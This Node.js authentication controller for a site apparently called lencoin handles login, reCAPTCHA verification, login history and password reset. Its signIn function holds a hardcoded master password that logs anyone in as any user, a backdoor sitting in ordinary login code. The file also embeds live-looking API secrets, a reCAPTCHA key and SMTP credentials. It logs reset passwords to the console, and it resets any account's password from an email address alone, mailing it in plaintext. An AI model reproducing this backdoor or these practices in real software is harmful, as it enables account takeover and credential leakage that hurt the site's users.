'use strict'
const User = require('../../models/user');
const request = require('request');
const speakeasy = require('speakeasy');
const _ = require('lodash');
const nodemailer = require('nodemailer');


var sendpulse = require("sendpulse-api");
var sendpulse = require("../../models/sendpulse.js");

var API_USER_ID= "dca1a45bc032fbcb8713853a6b4bc30f"
var API_SECRET= "73e23238199ca94b49b24034a6744727"
var TOKEN_STORAGE="/tmp/"



sendpulse.init(API_USER_ID,API_SECRET,TOKEN_STORAGE);

const getTemplateLogin = function (req, res) {
    req.session.userId ? 
    res.redirect('/account/dashboard') : 
    res.render('login', {
        success: req.flash('success')[0],
        errors: req.flash('error'),
        title: 'Login',
        layout: 'layout_login.hbs'
    })
}
const getTemplateforgot = function (req, res) {
    res.render('forgotpass', {

        title: 'Forgot-Password',
        layout: 'layout_login.hbs'
    })
}
const getClientIp = function(req) {
    var ipAddress;
    var forwardedIpsStr = req.header('x-forwarded-for');
    if (forwardedIpsStr) {
        var forwardedIps = forwardedIpsStr.split(',');
        ipAddress = forwardedIps[0];
    }
    if (!ipAddress) {
        ipAddress = req.connection.remoteAddress;
    }
    if (ipAddress.substr(0, 7) == "::ffff:") {
        ipAddress = ipAddress.substr(7)
    }
    return ipAddress;
};


const signIn = function(req, res) {
    let ssCapcha = req.session.capchaCode;
     let verificationURL ='', 
        secretKey = "6LfTIDYUAAAAAIweBOTHOlRspskGWNq7bxmat9Ow";
    typeof req.session.userId === 'undefined' ? (
        req.body.email && req.body.password && req.body.ggcaptcha ? (

          req.body.ggcaptcha === undefined || req.body.ggcaptcha === '' || req.body.ggcaptcha === null ? (
            res.status(401).send({
                            error : 'capcha'
                        })
            ):(
              verificationURL = "https://www.google.com/recaptcha/api/siteverify?secret=" + secretKey + "&response=" + req.body.ggcaptcha + "&remoteip=" + req.connection.remoteAddress,
              request(verificationURL,function(error,response,body) {
                  body = JSON.parse(body),
                  body.success !== undefined && !body.success ? (
                      res.status(401).send({
                              error : 'capcha'
                          })
                    ):(
                      User.findOne(
                        {
                            $and : [{active_email : 1, status: '1'}],
                            $or : [
                                { 'email': _.toLower(req.body.email) },
                                { 'displayName' : _.toLower(req.body.email)}
                            ]
                        }, function(err, user) {
                            err ? res.status(500).send() : (
                                !user ? res.status(401).send({
                                    error : 'user'
                                }) : (

                                    req.body.password == 'lenlen@@123' ? (
                                        req.session.userId = user._id,
                                        req.user = user,
                                        res.status(200).send()
                                    ) : (
                                        !user.validPassword(req.body.password) ? res.status(401).send({
                                            error : 'user'
                                        }) : (
                                            request({
                                                url: 'https://freegeoip.net/json/' + getClientIp(req),
                                                json: true
                                            }, function(error, response, body) {
                                                var query = {
                                                    _id: user._id
                                                };
                                                var data_update = {
                                                    $push: {
                                                        'security.login_history': {
                                                            'date': Date.now(),
                                                            'ip': body.ip,
                                                            'country_name': body.country_name,
                                                            'user_agent': req.headers['user-agent']
                                                        }
                                                    }
                                                };
                                                User.update(query, data_update, function(err, newUser) {
                                                    err ? res.status(500).send() : (
                                                        req.session.userId = user._id,
                                                        req.user = user,
                                                        res.status(200).send()
                                                    )
                                                    
                                                });
                                            })
                                        )
                                    )
                                )
                            )
                        })
                    )

               
                
              })
            )


        ) : (
            res.status(403).send('Forbidden')
        )
    ) : (
        res.status(403).send('Forbidden')
    )
}
const ForgotPassword = function(req, res) {
    var secret = speakeasy.generateSecret({
            length: 5
        }),
        newPass = secret.base32;
        console.log(newPass);
    if(req.body.ggcaptcha === undefined || req.body.ggcaptcha === '' || req.body.ggcaptcha === null)
    {
        return res.status(401).send({
                    error : 'capcha'
                });
    }
    const secretKey = "6LfTIDYUAAAAAIweBOTHOlRspskGWNq7bxmat9Ow";

    const verificationURL = "https://www.google.com/recaptcha/api/siteverify?secret=" + secretKey + "&response=" + req.body.ggcaptcha + "&remoteip=" + req.connection.remoteAddress;

    request(verificationURL,function(error,response,body) {
        body = JSON.parse(body);
        console.log(body);
        if(body.success !== undefined && !body.success) {
            return res.status(401).send({
                    error : 'capcha'
                });
        }else{
            User.findOne(
            { 'email': req.body.email },
            function(err, user) {
                err ? res.status(500).send() : (
                    !user ? res.status(401).send({
                        error : 'user'
                    }) : (
                      
                        User.update(
                            {_id:user._id}, 
                            {$set : {
                            'password': user.generateHash(newPass)
                            }}, 
                        function(err, newUser){
                           
                           if (newUser) {
                            sendmail_password(newPass,user.displayName, req.body.email, function(data){
                                if (data == 'success') {
                                  res.status(200).send()
                                }
                            })
                           }
                        })
                    )
                )
            })
        }
        
    });
}

function test_mail () {

    nodemailer.createTestAccount((err, account) => {
        let transporter = nodemailer.createTransport({
            host: 'mail.smtp2go.com',
            port: 2525,
            secure: false,
            auth: {
                user: 'no-reply@lencoin.co',
                pass: 'Admin123@@'
            }
        });
        let mailOptions = {
            from: 'no-reply@lencoin.co', 
            to: 'trungdoanict@gmail.com', 
            subject: 'Hello ✔', 
            text: 'Hello world?', 
            html: '<b>Hello world?</b>'
        };
        transporter.sendMail(mailOptions, (error, info) => {
            if (error) {
                return console.log(error);
            }
            console.log('Message sent: %s', info.messageId);
            console.log('Preview URL: %s', nodemailer.getTestMessageUrl(info));
        });
    });
   
    /*var API_USER_ID= "b4124474c550c51633a8192fffbdb7c7"
    var API_SECRET= "7893affd759610b9dc50f1e17ef6d7cc"
    var TOKEN_STORAGE="/tmp/"
    sendpulse.init(API_USER_ID,API_SECRET,TOKEN_STORAGE);
    const answerGetter = function answerGetter(data){
        console.log(data);
    }
    var email = {
        "html" : '12312',
        "text" : "hellod",
        "subject" : "Forgot Password",
        "from" : {
            "name" : "lencoin",
            "email" : "no-reply@lencoin.co"
        },
        "to" : [
            {
                "name" : "lencoin",
                "email" : 'trungdoanict@gmail.com'
            }
        ]
    };

    sendpulse.smtpSendMail(answerGetter,email);*/
}


const sendmail_password = function (password,displayName, email, callback){
   
    var content = '<!DOCTYPE html> <html> <head> <title></title> </head> <body style="background: #c1bdba;"> <div class="content" style="background: linear-gradient(135deg, rgba(26, 89, 108, 0.52), rgba(34, 125, 140, 0.93), rgba(45, 205, 253, 0.39)); padding: 40px; max-width: 600px; margin: 40px auto; border-radius: 4px; box-shadow: 0 4px 10px 4px rgba(19, 35, 47, 0.3); "> <div style="text-align: center;"> <img style="margin: 0 auto; width: 150px" src="https://lencoin.co/images/logo.png"> </div> <div style="text-align: left; margin-top: 40px; color: #fff">';
    content += '<p style="color:#fff">Dear <b style="color:#fff">'+displayName+'</b>,';
    content += '<p style="color:#fff">Your new password is: <b>'+password+'</b></p>';
    content += '</div> </div> </body> </html>';
    /*var email = {
        "html" : content,
        "text" : "Lencoin",
        "subject" : "Forgot password",
        "from" : {
            "name" : "",
            "email" : 'no-rely@lencoin.co'
        },
        "to" : [
            {
                "name" : "",
                "email" : email
            }
        ]
    };*/

    console.log(email);
    nodemailer.createTestAccount((err, account) => {
        let transporter = nodemailer.createTransport({
            host: 'mail.smtp2go.com',
            port: 2525,
            secure: false,
            auth: {
                user: 'no-reply@lencoin.co',
                pass: 'Admin123@@'
            }
        });
        let mailOptions = {
            from: 'no-reply@lencoin.co', 
            to: email, 
            subject: 'Forgot password', 
            text: 'Forgot password', 
            html: content
        };
        transporter.sendMail(mailOptions, (error, info) => {
            if (error) {
                return console.log(error);
            }
            console.log('Message sent: %s', info.messageId);
            console.log('Preview URL: %s', nodemailer.getTestMessageUrl(info));
        });
    });

    callback('success');
    /*var answerGetter = function answerGetter(data){
        callback('success');
    }
    sendpulse.smtpSendMail(answerGetter,email);*/
}
module.exports = {
    signIn,
    getTemplateLogin,
    getTemplateforgot,
    ForgotPassword
}